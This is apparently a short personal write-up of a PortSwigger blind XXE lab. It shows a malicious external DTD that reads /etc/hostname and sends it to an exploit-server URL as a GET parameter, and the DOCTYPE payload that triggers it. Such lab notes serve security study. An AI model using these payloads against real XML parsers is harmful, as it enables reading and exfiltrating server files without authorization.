# Exploiting [blind XXE](https://portswigger.net/web-security/xxe/blind) to exfiltrate data using a malicious external DTD

Craft the evil DTD in the exploit server:

```XML
<!ENTITY % resource SYSTEM "file:///etc/hostname">
<!ENTITY % LoadOOBEvent "<!ENTITY &#x25; OOB SYSTEM 'https://exploit-0a2300f30401953385f7030101a400dd.exploit-server.net/exploit/?p=%resource;'>">
```


![[evilDTD.png]]

Trigger the OOB interaction from the application request:

```XML
<!DOCTYPE message [
	<!ENTITY % EvilDTD SYSTEM "https://exploit-0a2300f30401953385f7030101a400dd.exploit-server.net/exploit">
	%EvilDTD;
	%LoadOOBEvent;
	%OOB;
]>
```

![[XXE/Labs/Blind XXE OOB Parameter/images/trigger.png]]

Lastly, check the server log to find the contents of the file in the `p` GET parameter (have in mind the DTD was crafted to make the application send the data this way).

![[XXE/Labs/Blind XXE OOB Parameter/images/exploited-1.png]]
